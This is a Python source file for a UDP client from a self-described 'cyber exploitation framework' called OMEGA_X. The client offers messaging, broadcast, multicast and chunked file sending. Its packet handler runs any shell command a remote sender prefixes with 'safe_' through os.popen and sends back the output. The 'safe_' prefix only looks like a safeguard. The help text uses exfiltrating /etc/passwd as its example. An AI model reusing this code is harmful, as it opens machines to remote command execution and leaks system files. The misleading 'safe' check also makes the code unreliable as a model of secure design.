#!/usr/bin/env python3
"""
OMEGA_X UDP Client
==================

Advanced UDP client for OMEGA_X cyber exploitation framework.
Features connectionless communication, broadcasting, and data transmission.

USAGE:
    python3 udp_client.py --host <server_ip> --port <port> [--broadcast] [--multicast <group>]

FEATURES:
- Connectionless UDP communication
- Broadcasting capabilities
- Multicast support
- Packet fragmentation handling
- Real-time data transmission
- Cross-platform compatibility

AUTHOR: OMEGA_X Development Team
"""

import socket
import threading
import time
import os
import sys
import argparse
import json
import base64
import hashlib
import struct
from datetime import datetime
import select

# OMEGA_X imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from omega_launcher import Colors

class OMEGAUDPClient:
    """Advanced UDP client for OMEGA_X operations"""

    def __init__(self, host, port, broadcast=False, multicast=None, timeout=5.0, buffer_size=4096):
        self.host = host
        self.port = port
        self.broadcast = broadcast
        self.multicast = multicast
        self.timeout = timeout
        self.buffer_size = buffer_size

        self.socket = None
        self.running = False
        self.session_id = self.generate_session_id()

        # Multicast setup
        self.multicast_group = None
        if multicast:
            self.multicast_group = multicast

        # Statistics
        self.stats = {
            'start_time': datetime.now(),
            'packets_sent': 0,
            'packets_received': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'errors': 0
        }

        # Packet sequencing
        self.sequence_number = 0
        self.expected_sequence = {}

    def generate_session_id(self):
        """Generate unique session identifier"""
        timestamp = str(time.time())
        random_data = os.urandom(16).hex()
        session_string = f"{timestamp}_{random_data}"
        return hashlib.sha256(session_string.encode()).hexdigest()[:16]

    def create_socket(self):
        """Create and configure UDP socket"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Set timeout
        self.socket.settimeout(self.timeout)

        # Enable broadcasting if requested
        if self.broadcast:
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            print(f"{Colors.BLUE}📡 Broadcast mode enabled{Colors.ENDC}")

        # Join multicast group if specified
        if self.multicast_group:
            # Set up multicast
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)

            # Join multicast group
            group = socket.inet_aton(self.multicast_group)
            mreq = struct.pack('4sL', group, socket.INADDR_ANY)
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

            print(f"{Colors.BLUE}🎯 Joined multicast group: {self.multicast_group}{Colors.ENDC}")

    def start(self):
        """Start the UDP client"""
        try:
            print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.ENDC}")
            print(f"{Colors.CYAN}║{Colors.ENDC}                     {Colors.RED}📡 OMEGA_X UDP CLIENT 📡{Colors.ENDC}                      {Colors.CYAN}║{Colors.ENDC}")
            print(f"{Colors.CYAN}║{Colors.ENDC}              {Colors.YELLOW}CONNECTIONLESS DATA TRANSMISSION{Colors.ENDC}                {Colors.CYAN}║{Colors.ENDC}")
            print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}")

            print(f"{Colors.BLUE}🎯 Target: {self.host}:{self.port}{Colors.ENDC}")
            print(f"{Colors.BLUE}📡 Broadcast: {'Enabled' if self.broadcast else 'Disabled'}{Colors.ENDC}")
            if self.multicast:
                print(f"{Colors.BLUE}🎯 Multicast: {self.multicast}{Colors.ENDC}")
            print(f"{Colors.BLUE}⏱️  Timeout: {self.timeout}s{Colors.ENDC}")
            print()

            # Create socket
            self.create_socket()
            self.running = True

            print(f"{Colors.GREEN}✅ UDP Client started (Session: {self.session_id}){Colors.ENDC}")
            print(f"{Colors.YELLOW}Type 'help' for commands, 'exit' to quit{Colors.ENDC}")
            print()

            # Start receiver thread
            receiver_thread = threading.Thread(target=self.receiver_loop, daemon=True)
            receiver_thread.start()

            # Interactive console
            self.interactive_console()

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to start UDP client: {e}{Colors.ENDC}")
            sys.exit(1)

    def receiver_loop(self):
        """Receive UDP packets in a loop"""
        while self.running:
            try:
                # Receive packet
                data, addr = self.socket.recvfrom(self.buffer_size)
                self.stats['packets_received'] += 1
                self.stats['bytes_received'] += len(data)

                # Process packet
                self.process_packet(data, addr)

            except socket.timeout:
                # Timeout is normal for UDP
                continue
            except Exception as e:
                if self.running:
                    self.stats['errors'] += 1
                    print(f"{Colors.RED}❌ Receive error: {e}{Colors.ENDC}")

    def process_packet(self, data, addr):
        """Process received UDP packet"""
        try:
            # Try to decode as JSON
            try:
                packet = json.loads(data.decode('utf-8'))
                self.handle_json_packet(packet, addr)
            except json.JSONDecodeError:
                # Binary data
                self.handle_binary_packet(data, addr)

        except Exception as e:
            print(f"{Colors.RED}❌ Packet processing error: {e}{Colors.ENDC}")

    def handle_json_packet(self, packet, addr):
        """Handle JSON packet"""
        packet_type = packet.get('type')

        if packet_type == 'echo':
            print(f"{Colors.GREEN}📨 Echo from {addr}: {packet.get('message', 'No message')}{Colors.ENDC}")

        elif packet_type == 'command':
            command = packet.get('command', '')
            print(f"{Colors.BLUE}⚡ Received command from {addr}: {command}{Colors.ENDC}")

            # Execute command (be careful with this!)
            if command.startswith('safe_'):  # Only allow safe commands
                try:
                    result = os.popen(command[5:]).read()  # Remove 'safe_' prefix
                    response = {
                        'type': 'command_result',
                        'session_id': self.session_id,
                        'command': command,
                        'result': result[:1000],  # Limit response size
                        'timestamp': datetime.now().isoformat()
                    }
                    self.send_packet(response, addr)
                except Exception as e:
                    error_response = {
                        'type': 'error',
                        'session_id': self.session_id,
                        'error': str(e),
                        'timestamp': datetime.now().isoformat()
                    }
                    self.send_packet(error_response, addr)

        elif packet_type == 'heartbeat':
            # Respond to heartbeat
            response = {
                'type': 'heartbeat_ack',
                'session_id': self.session_id,
                'timestamp': datetime.now().isoformat()
            }
            self.send_packet(response, addr)

        else:
            print(f"{Colors.BLUE}📨 Unknown packet type '{packet_type}' from {addr}{Colors.ENDC}")

    def handle_binary_packet(self, data, addr):
        """Handle binary packet"""
        print(f"{Colors.BLUE}📦 Binary data ({len(data)} bytes) from {addr}{Colors.ENDC}")

        # For binary data, you could save it to a file or process it
        # This is just a placeholder

    def send_packet(self, packet, addr=None):
        """Send UDP packet"""
        try:
            if addr is None:
                addr = (self.host, self.port)

            # Convert to JSON if it's a dict
            if isinstance(packet, dict):
                data = json.dumps(packet).encode('utf-8')
            else:
                data = packet

            # Send packet
            self.socket.sendto(data, addr)
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(data)

        except Exception as e:
            self.stats['errors'] += 1
            print(f"{Colors.RED}❌ Send error: {e}{Colors.ENDC}")

    def send_message(self, message, addr=None):
        """Send a simple text message"""
        packet = {
            'type': 'message',
            'session_id': self.session_id,
            'message': message,
            'timestamp': datetime.now().isoformat()
        }
        self.send_packet(packet, addr)

    def send_echo(self, message="Hello from OMEGA_X UDP Client", addr=None):
        """Send echo packet"""
        packet = {
            'type': 'echo',
            'session_id': self.session_id,
            'message': message,
            'timestamp': datetime.now().isoformat()
        }
        self.send_packet(packet, addr)

    def broadcast_message(self, message):
        """Broadcast message to all on network"""
        if not self.broadcast:
            print(f"{Colors.RED}❌ Broadcast not enabled{Colors.ENDC}")
            return

        broadcast_addr = ('255.255.255.255', self.port)
        self.send_message(f"[BROADCAST] {message}", broadcast_addr)
        print(f"{Colors.GREEN}📢 Broadcasted: {message}{Colors.ENDC}")

    def multicast_message(self, message):
        """Send message to multicast group"""
        if not self.multicast_group:
            print(f"{Colors.RED}❌ Multicast not configured{Colors.ENDC}")
            return

        multicast_addr = (self.multicast_group, self.port)
        self.send_message(f"[MULTICAST] {message}", multicast_addr)
        print(f"{Colors.GREEN}🎯 Multicast: {message}{Colors.ENDC}")

    def send_file(self, file_path, addr=None):
        """Send file via UDP (fragmented)"""
        try:
            if not os.path.exists(file_path):
                print(f"{Colors.RED}❌ File not found: {file_path}{Colors.ENDC}")
                return

            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)

            print(f"{Colors.BLUE}📁 Sending file: {file_name} ({file_size} bytes){Colors.ENDC}")

            # Read file in chunks
            chunk_size = 1024  # 1KB chunks
            sequence = 0

            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break

                    # Create file packet
                    packet = {
                        'type': 'file_chunk',
                        'session_id': self.session_id,
                        'filename': file_name,
                        'sequence': sequence,
                        'total_size': file_size,
                        'chunk_size': len(chunk),
                        'data': base64.b64encode(chunk).decode(),
                        'timestamp': datetime.now().isoformat()
                    }

                    # Send chunk
                    self.send_packet(packet, addr)
                    sequence += 1

                    # Small delay to prevent overwhelming
                    time.sleep(0.01)

            # Send end marker
            end_packet = {
                'type': 'file_end',
                'session_id': self.session_id,
                'filename': file_name,
                'total_chunks': sequence,
                'timestamp': datetime.now().isoformat()
            }
            self.send_packet(end_packet, addr)

            print(f"{Colors.GREEN}✅ File sent: {sequence} chunks{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.RED}❌ File send error: {e}{Colors.ENDC}")

    def show_stats(self):
        """Show client statistics"""
        uptime = datetime.now() - self.stats['start_time']

        print(f"{Colors.BLUE}UDP Client Statistics:{Colors.ENDC}")
        print(f"  Uptime: {str(uptime).split('.')[0]}")
        print(f"  Session ID: {self.session_id}")
        print(f"  Packets Sent: {self.stats['packets_sent']}")
        print(f"  Packets Received: {self.stats['packets_received']}")
        print(f"  Bytes Sent: {self.stats['bytes_sent']}")
        print(f"  Bytes Received: {self.stats['bytes_received']}")
        print(f"  Errors: {self.stats['errors']}")

    def interactive_console(self):
        """Interactive UDP client console"""
        while self.running:
            try:
                command = input(f"{Colors.GREEN}OMEGA_UDP>{Colors.ENDC} ").strip()

                if not command:
                    continue

                if command.lower() in ['exit', 'quit']:
                    self.stop()
                    break

                if command.lower() == 'help':
                    self.show_help()
                    continue

                if command.lower() == 'stats':
                    self.show_stats()
                    continue

                if command.lower() == 'echo':
                    self.send_echo()
                    continue

                if command.lower().startswith('send '):
                    message = command[5:]
                    self.send_message(message)
                    continue

                if command.lower().startswith('broadcast '):
                    message = command[10:]
                    self.broadcast_message(message)
                    continue

                if command.lower().startswith('multicast '):
                    message = command[10:]
                    self.multicast_message(message)
                    continue

                if command.lower().startswith('file '):
                    file_path = command[5:]
                    self.send_file(file_path)
                    continue

                # Unknown command
                print(f"{Colors.YELLOW}Unknown command. Type 'help' for available commands.{Colors.ENDC}")

            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}⚠️  Use 'exit' to quit{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.RED}❌ Console error: {e}{Colors.ENDC}")

    def show_help(self):
        """Show available commands"""
        help_text = """
OMEGA_X UDP Client Commands:
============================

Basic Commands:
  help              Show this help
  exit/quit         Exit the client
  stats             Show client statistics

Messaging:
  send <message>    Send message to server
  echo              Send echo packet
  broadcast <msg>   Broadcast message to network
  multicast <msg>   Send to multicast group

File Transfer:
  file <path>       Send file to server

Examples:
  send Hello World
  broadcast ALERT: System compromised
  file /etc/passwd
  echo
"""
        print(help_text)

    def stop(self):
        """Stop the UDP client"""
        print(f"{Colors.YELLOW}🛑 Shutting down OMEGA_X UDP Client...{Colors.ENDC}")

        self.running = False

        # Close socket
        if self.socket:
            self.socket.close()

        print(f"{Colors.GREEN}✅ UDP Client shutdown complete{Colors.ENDC}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="OMEGA_X UDP Client")
    parser.add_argument('--host', required=True, help='Target hostname/IP')
    parser.add_argument('--port', type=int, default=4445, help='Target port (default: 4445)')
    parser.add_argument('--broadcast', action='store_true', help='Enable broadcast mode')
    parser.add_argument('--multicast', help='Multicast group address')
    parser.add_argument('--timeout', type=float, default=5.0, help='Socket timeout (default: 5.0)')

    args = parser.parse_args()

    # Create and start client
    client = OMEGAUDPClient(
        host=args.host,
        port=args.port,
        broadcast=args.broadcast,
        multicast=args.multicast,
        timeout=args.timeout
    )

    try:
        client.start()
    except KeyboardInterrupt:
        client.stop()
    except Exception as e:
        print(f"{Colors.RED}❌ UDP Client error: {e}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()